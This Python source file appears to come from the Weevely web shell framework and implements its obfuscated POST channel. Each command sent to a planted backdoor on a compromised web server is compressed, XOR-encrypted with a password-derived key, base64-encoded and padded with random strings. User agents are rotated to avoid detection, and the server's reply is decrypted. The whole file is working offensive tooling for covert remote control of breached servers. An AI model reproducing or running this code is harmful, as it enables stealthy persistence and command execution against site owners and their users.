import base64
import hashlib
import http.client
import random
import re
import string
import urllib.error
import urllib.parse
import urllib.request
import zlib

from weevely import utils
from weevely.core import config
from weevely.core.loggers import dlog
from weevely.core.loggers import log


PREPEND = utils.strings.randstr(16, charset=string.printable)
APPEND = utils.strings.randstr(16, charset=string.printable)


class ObfPost:
    def __init__(self, url, password):
        # Generate the 8 char long main key. Is shared with the server and
        # used to check header, footer, and encrypt the payload.
        password = password.encode("utf-8")

        passwordhash = hashlib.md5(password).hexdigest().lower()  # noqa: S324
        self.shared_key = passwordhash[:8].encode("utf-8")
        self.header = passwordhash[8:20].encode("utf-8")
        self.trailer = passwordhash[20:32].encode("utf-8")

        self.url = url
        url_parsed = urllib.parse.urlparse(url)
        self.url_base = f"{url_parsed.scheme}://{url_parsed.netloc}"

        # init regexp for the returning data
        self.re_response = re.compile(b"%s(.*)%s" % (self.header, self.trailer), re.DOTALL)
        self.re_debug = re.compile(b"%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer), re.DOTALL)

        # Load agent
        # TODO: add this to the other channels
        agents = utils.http.load_all_agents()
        random.shuffle(agents)
        self.agent = agents[0]

        # Init additional headers list
        self.additional_headers = config.additional_headers

    def send(self, original_payload, additional_handlers=[]):
        if isinstance(original_payload, str):
            original_payload = original_payload.encode("utf-8")

        xorred_payload = utils.strings.sxor(zlib.compress(original_payload), self.shared_key)

        obfuscated_payload = base64.b64encode(xorred_payload).rstrip(b"=")

        wrapped_payload = PREPEND + self.header + obfuscated_payload + self.trailer + APPEND

        opener = urllib.request.build_opener(*additional_handlers)

        additional_ua = ""
        for h in self.additional_headers:
            if h[0].lower() == "user-agent" and h[1]:
                additional_ua = h[1]
                break

        opener.addheaders = [("User-Agent", additional_ua if additional_ua else self.agent), *self.additional_headers]

        dlog.debug(f"[R] {wrapped_payload[0:32]}...")

        url = self.url if not config.add_random_param_nocache else utils.http.add_random_url_param(self.url)

        try:
            response = opener.open(url, data=wrapped_payload).read()
        except http.client.BadStatusLine:
            # TODO: add this check to the other channels
            log.warning("Connection closed unexpectedly, aborting command.")
            return None

        if not response:
            return None

        # Multiple debug string may have been printed, using findall
        matched_debug = self.re_debug.findall(response)
        if matched_debug:
            dlog.debug("\n".join(matched_debug))

        matched = self.re_response.search(response)

        matched = self.re_response.search(response)

        if matched and matched.group(1):
            return zlib.decompress(utils.strings.sxor(base64.b64decode(matched.group(1)), self.shared_key))

        return None
